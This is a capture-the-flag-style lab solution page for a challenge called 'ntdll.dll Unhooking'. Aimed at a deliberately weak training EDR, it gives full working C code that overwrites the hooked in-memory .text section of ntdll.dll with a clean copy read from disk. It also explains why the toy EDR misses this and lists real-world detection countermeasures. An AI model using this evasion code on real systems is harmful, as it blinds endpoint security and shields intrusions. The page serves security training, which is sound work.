---
title: "Solution 24: ntdll.dll Unhooking"
difficulty: hard
category: "API Hook Evasion"
---

[Back to Challenge]({{ '/challenges/24-ntdll-unhooking/' | relative_url }})

## Overview

EDR userland hooks work by patching the first bytes of ntdll.dll functions in memory (typically a `JMP` to the EDR's inspection DLL). Unhooking restores the original code from a clean copy on disk. MostShittyEDR has zero runtime hook integrity monitoring, so this goes completely undetected.

## Solution

```c
// unhook_ntdll.c - restore ntdll.dll .text section from disk
#include <windows.h>
#include <stdio.h>

int main() {
    // 1. Get the in-memory base of ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    // 2. Map a fresh copy from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

    // 3. Parse PE headers to find .text section
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            // 4. Make the in-memory .text section writable
            DWORD oldProtect;
            VirtualProtect(
                (BYTE*)ntdll + sec[i].VirtualAddress,
                sec[i].Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtect);

            // 5. Overwrite hooked code with clean code from disk
            memcpy(
                (BYTE*)ntdll + sec[i].VirtualAddress,
                (BYTE*)cleanNtdll + sec[i].PointerToRawData,
                sec[i].Misc.VirtualSize);

            // 6. Restore original protection
            VirtualProtect(
                (BYTE*)ntdll + sec[i].VirtualAddress,
                sec[i].Misc.VirtualSize,
                oldProtect,
                &oldProtect);

            printf("[+] Unhooked ntdll.dll .text section (%lu bytes)\n",
                   sec[i].Misc.VirtualSize);
            break;
        }
    }

    // Now all ntdll functions are unhooked - call them freely
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
}
```

## Why It Works

The MostShittyEDR has no mechanism to detect unhooking:

1. **No hook integrity checks**: It never re-reads ntdll.dll stubs to verify hooks are intact
2. **No `VirtualProtect` monitoring**: Changing memory protection on ntdll pages goes unnoticed
3. **No ETW for memory operations**: `NtProtectVirtualMemory` and `NtWriteVirtualMemory` calls are not monitored
4. **Static-only analysis**: Rule 7 reads the PE file on disk once, never inspects runtime memory

After unhooking, all ntdll functions execute their original, unhooked code. Even if the process statically imports hooked APIs (triggering Rule 7's IAT check), the actual hooks in memory are gone.

## Real-World Countermeasures

Modern EDRs detect unhooking through:
- **Periodic hook integrity verification**: Re-checking that hooks are still in place
- **Kernel callbacks for `NtProtectVirtualMemory`**: Detecting when ntdll pages become writable
- **ETW-TI**: Kernel telemetry that reports regardless of userland hooks
- **Guard pages**: Setting PAGE_GUARD on hooked memory to trigger exceptions on writes

See the blog post [Hunting the Watchers: Detecting EDR Hooks](https://benjitrapp.github.io/attacks/2026-06-19-edr-hook-detection/) for detection techniques from the defender's perspective.

## How to Verify

1. Start the EDR: `.\edr_agent.exe --profile crowdstrike --verbose --no-kill`
2. Run `unhook_ntdll.exe` — the EDR shows no detection of the unhooking itself
3. After unhooking, subsequent calls to hooked APIs execute the original unhooked code
